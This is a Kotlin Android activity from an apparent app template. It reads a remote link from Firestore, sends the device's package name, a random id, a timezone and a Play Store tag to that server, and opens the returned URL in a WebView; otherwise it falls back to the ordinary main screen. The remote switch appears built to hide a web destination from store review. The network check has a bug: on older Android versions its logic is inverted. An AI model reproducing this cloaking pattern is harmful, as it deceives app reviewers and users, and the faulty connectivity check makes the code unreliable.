package com.template

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.template.databinding.ActivityWebBinding
import okhttp3.OkHttpClient
import okhttp3.Request
import okio.use
import java.io.IOException
import java.util.*


class LoadingActivity : AppCompatActivity() {

    private lateinit var analytics: FirebaseAnalytics
    var userAgent :String = ""
    var flag :Boolean = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d("nn97","$savedInstanceState loading act")
        setContentView(R.layout.activity_loading)
        analytics = Firebase.analytics
        val bindingWeb = ActivityWebBinding.inflate(layoutInflater)
        userAgent = bindingWeb.webView.settings.userAgentString
            if (!isNetworkConnected()) {
                startActivity(Intent(this, MainActivity::class.java))
            } else {
                val progressBar: ProgressBar = findViewById(R.id.progressBar)
                progressBar.visibility = View.VISIBLE
                val db = Firebase.firestore
                db.collection("database").document("check")
                    .get()
                    .addOnSuccessListener {
                        val local = it.get("link").toString()
                        Log.d("nn97", "$local то, что получили из файрбэйза")
                        if (local.equals("")) {
                            startActivity(Intent(this, MainActivity::class.java))
                        } else {
                            val link = makingLink(local)
                            Log.d("nn97", "$link с телефона обращаемся к этому серверу, сайту")
                            connectionToServer(link)
                        }
                    }
            }
    }

    private fun makingLink(domain: String): String {
        val uuid =  UUID.randomUUID().toString()
        return "$domain/?packageid=$packageName&userid=$uuid&getz=Europe/Moscow&getr=utm_source=google-play&utm_medium=organic"
    }

    private fun connectionToServer(link: String) {
        //синх запрос в новом потоке
        Thread {
          val client = OkHttpClient()
            val request :Request = Request.Builder().url(link).addHeader("User-Agent",userAgent).build()
            Log.d("nn97", "обращение к серваку")
            try {
                client.newCall(request).execute().use {
                    if (!it.isSuccessful){
                        Log.d("nn97", "${it.code} ${it.message}")
                        startActivity(Intent(this, MainActivity::class.java))
                    }else{
                        Log.d("nn97", "200")
                        val urlForWebActivity = it.body!!.string()
                        val sharedPref =
                            this.getSharedPreferences("main",Context.MODE_PRIVATE) ?: return@Thread
                        with(sharedPref.edit()) {
                            putString(KEY, urlForWebActivity)
                            apply()
                        }
                        Log.d("nn97", "открывай веб")
                        flag = true
                        startActivity(Intent(this, WebActivity::class.java))
                    }
                }
            } catch (e: IOException){
                println("Ошибка подключения: $e")
            }
        }.start()
    }

    companion object {
        private const val KEY = "urlForWeb"
    }

    private fun isNetworkConnected(): Boolean {
        var connected = true
        val connManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val networkCapabilities = connManager.getNetworkCapabilities(connManager.activeNetwork)
            if (networkCapabilities == null) {
                connected = false
            }
        } else {
            val activeNetwork = connManager.activeNetworkInfo
            if (activeNetwork?.isConnectedOrConnecting == true && activeNetwork.isAvailable) {
                connected = false
            }
        }
        return connected
    }
}